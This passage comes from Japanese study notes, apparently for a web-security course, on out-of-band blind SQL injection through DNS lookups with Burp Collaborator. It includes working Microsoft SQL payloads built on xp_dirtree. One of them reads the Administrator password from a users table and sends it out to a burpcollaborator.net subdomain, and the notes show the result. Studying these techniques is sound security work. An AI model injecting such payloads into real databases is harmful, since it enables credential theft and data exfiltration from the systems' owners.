2. [SQLi cheatsheet: DNS lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet)を参考に、PoCの文法からどのDBMSか検討をつける

###### Expoit

3. [SQLi cheatsheet: DNS lookup with data exfiltration](https://portswigger.net/web-security/sql-injection/cheat-sheet)の`SELECT YOUR-QUERY-HERE`を目的のペイロードに変更する
	- `()`はそのまま
4. `BURP-COLLABORATOR-SUBDOMAIN`にはcollaboratorでcopy to clipboardしたものをそのままペーストする
	- 抽出したデータと混同しないように、ドメイン名はメモしておく
5. CollaboratorのPoll nowからDNS lookupで`機密情報.collaboratorのドメイン`というエントリを見つける

### 基本

- [4-1. Boolean-based SQLi](4-1.%20Boolean-based%20SQLi.md)と[4-2. Error-based SQLi](4-2.%20Error-based%20SQLi.md)、[4-3. Time-based SQLi](4-3.%20Time-based%20SQLi.md)のどれもが使用できなくても使える。成功確率が高く、直接データを抽出できるので、最も==優先度高い==
- 攻撃者が制御しているシステムに対して帯域外のネットワークインタラクションをトリガーすることで、Blind SQLi脆弱性を悪用する。
- これらは注入された条件に基づいてトリガーされ、情報を一度に一つずつ推測することができる。
  
- この目的のために様々なネットワーク・プロトコルを使用することができるが、==最も効果的なのはDNS==である。
- DNSクエリはシステムの正常な動作に不可欠であるため、DNSクエリの受信に制限がない
#### 概要
1. ハッカーはSQLiに脆弱なWebサイトに対してペイロードを注入してリクエストする
2. Webサイトはハッカーのペイロードを渡すSQLを作成する
3. ペイロードにはDBから得た情報を強制的にハッカーのもとへ送信させるHTTP/DNSリクエストが含まれている

#### 方法概要
- [Burp Suiteの基本操作・トラブルシューティング](../../../../OSCP/Cheatsheet/Web%20App/Burp%20Suiteの基本操作・トラブルシューティング.md#Collaborator(Pro-only))
- RDBごとの違い: [SQLi cheet sheet DNS lookup & DNS lookup with data exfiltration](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=SLEEP(10)%2C%27a%27-,DNS%20lookup,-You%20can%20cause)
- 例えば、以下のペイロードを注入するとMicrosoft SQLで指定したドメインのDNS名前解決ができる
```sql
'; exec master..xp_dirtree '//[Burp-Collaborator-Subdomain.burpcollaborator.net]/a'--
```
- これにより、DBは指定したサブドメインを名前解決する

- 例えば、MicrosoftSQLでは以下のペイロードを注入するとデータを直接漏洩させられる
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
- 結果
```
[password]cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

- **＊**: /aは必要ないかも
